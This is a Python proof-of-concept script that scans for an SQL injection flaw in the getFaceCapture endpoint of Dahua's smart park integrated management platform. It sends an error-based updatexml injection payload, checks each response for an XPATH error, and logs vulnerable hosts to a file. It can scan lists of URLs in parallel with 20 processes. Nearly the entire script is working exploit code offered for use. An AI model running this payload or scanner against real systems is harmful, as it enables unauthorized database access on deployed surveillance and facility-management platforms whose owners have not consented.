import requests,argparse,time,sys
requests.packages.urllib3.disable_warnings()
from multiprocessing import Pool

def banner():
    test = """
  ______  __         __
 / ___/ |/_/__ ___ _/ /
/ /___>  <(_-</ _ `/ / 
\___/_/|_/___/\_, /_/  
               /_/     
"""
    print(test)


def poc(target):
    payload= "/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(123)),0x7e),1)--%22%7D/extend/%7B%7D"
    proxies = {
        "http":"http://127.0.0.1:8080",
        "https":"http://127.0.0.1:8080"
    }
    try:
        res1 = requests.get(url=target,verify=False,timeout=15)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload,verify=False,timeout=15)
            if "XPATH" in res2.text:
                print(f"[+]{target}存在报错注入漏洞")
                with open ("大华报错注入_result.txt", "a", encoding="utf-8") as f:
                    f.write(f"[+]{target}存在延时注入漏洞\n")
        # elif res1.status_code != 200:
        #     print(f"{target}可能存在问题")

            else:
                print(f"[-]{target}不存在漏洞")
    except Exception as e:
        print(f"{target}该网站可能存在漏洞，请手工测试")
def main():
    banner()
    parser =argparse.ArgumentParser(description="大华智慧园区综合管理平台getFaceCaptureSQL注入漏洞")
    parser.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parser.add_argument("-f","--file",dest="file",type=str,help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(20)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\tpython3 {sys.argv[0]} -h or --help")

if __name__=='__main__':
    main()